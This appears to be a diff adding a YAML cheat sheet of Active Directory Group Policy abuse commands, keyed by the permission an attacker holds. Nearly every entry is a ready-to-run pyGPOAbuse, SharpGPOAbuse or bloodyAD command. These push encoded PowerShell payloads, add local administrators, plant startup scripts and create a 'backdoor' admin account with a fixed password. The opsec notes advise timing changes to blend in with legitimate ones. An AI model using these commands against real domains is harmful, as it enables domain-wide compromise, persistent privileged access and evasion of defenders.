@@ -1,0 +1,130 @@
+# GPO Abuse Commands
+# Attacks: GPO modification, GPO linking, GPO control
+
+GPLink:
+  OU:
+    description: "GPO linked to OU - affects all objects in OU"
+    commands:
+      - name: "If you can modify the GPO - add immediate scheduled task"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<GPO_ID>' -command 'powershell.exe -enc <PAYLOAD>' -f
+      - name: "Add local admin via GPO"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO_NAME>"
+      - name: "Add startup script via GPO"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --ScriptContents 'net localgroup administrators <USER> /add' --GPOName "<GPO_NAME>"
+    opsec:
+      - "GPO changes replicate to all DCs"
+      - "Changes affect all computers in linked OUs"
+      - "Scheduled tasks visible in Task Scheduler"
+      - "Startup scripts visible in SYSVOL"
+
+  Domain:
+    description: "GPO linked to domain - affects entire domain"
+    commands:
+      - name: "Modify GPO for domain-wide access"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<GPO_ID>' -command 'powershell.exe -enc <PAYLOAD>' -f
+    opsec:
+      - "Domain-linked GPOs affect ALL domain computers"
+      - "Highly visible attack"
+      - "Consider targeting specific OUs instead"
+
+GPOControlled:
+  GPO:
+    description: "Control over GPO object - can modify GPO settings"
+    commands:
+      - name: "Add immediate scheduled task"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<TARGET>' -command 'powershell.exe -enc <PAYLOAD>' -f
+      - name: "Add computer startup script"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --ScriptContents 'net localgroup administrators <USER> /add' --GPOName "<TARGET>"
+      - name: "Add user logon script"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddUserScript --ScriptName evil.bat --ScriptContents '<PAYLOAD>' --GPOName "<TARGET>"
+      - name: "Add local admin"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<TARGET>"
+      - name: "Create new user in GPO"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddNewImmediateTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "<TARGET>"
+    opsec:
+      - "GPO modifications are stored in SYSVOL"
+      - "Changes replicate to all DCs"
+      - "Scheduled tasks create Event ID 4698"
+      - "Consider timing with legitimate GPO changes"
+
+GenericAll:
+  GPO:
+    description: "Full control over GPO - can modify all settings"
+    commands:
+      - name: "Add immediate scheduled task"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<TARGET>' -command 'powershell.exe -enc <PAYLOAD>' -f
+      - name: "Add computer startup script"
+        tool: SharpGPOAbuse
+        command: |
+          SharpGPOAbuse.exe --AddComputerScript --ScriptName evil.bat --ScriptContents 'net localgroup administrators <USER> /add' --GPOName "<TARGET>"
+    opsec:
+      - "Full control means you can use any GPO abuse technique"
+      - "GPO changes are stored in SYSVOL and visible"
+
+GenericWrite:
+  GPO:
+    description: "Write access to GPO - can add scripts and tasks"
+    commands:
+      - name: "Add scheduled task"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<TARGET>' -command 'powershell.exe -enc <PAYLOAD>' -f
+    opsec:
+      - "Write access is sufficient for most GPO abuse"
+      - "Scripts and tasks are stored in SYSVOL"
+
+WriteDacl:
+  GPO:
+    description: "Modify GPO ACL - grant yourself write access"
+    commands:
+      - name: "Grant yourself GenericAll on GPO"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+      - name: "Then abuse GPO"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<TARGET>' -command 'powershell.exe -enc <PAYLOAD>' -f
+    opsec:
+      - "ACL modification creates Event ID 5136"
+      - "Two-step attack is more visible"
+
+WriteOwner:
+  GPO:
+    description: "Take ownership of GPO then modify"
+    commands:
+      - name: "Take ownership"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> set owner '<TARGET>' '<ATTACKER_USER>'
+      - name: "Grant yourself write access"
+        tool: bloodyAD
+        command: |
+          bloodyAD -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --host <DC_IP> add genericAll '<TARGET>' '<ATTACKER_USER>'
+      - name: "Abuse GPO"
+        tool: pyGPOAbuse
+        command: |
+          pygpoabuse.py '<DOMAIN>/<USERNAME>:<PASSWORD>' -gpo-id '<TARGET>' -command 'powershell.exe -enc <PAYLOAD>' -f
+    opsec:
+      - "Ownership change creates Event ID 5136"
+      - "Three-step attack chain"
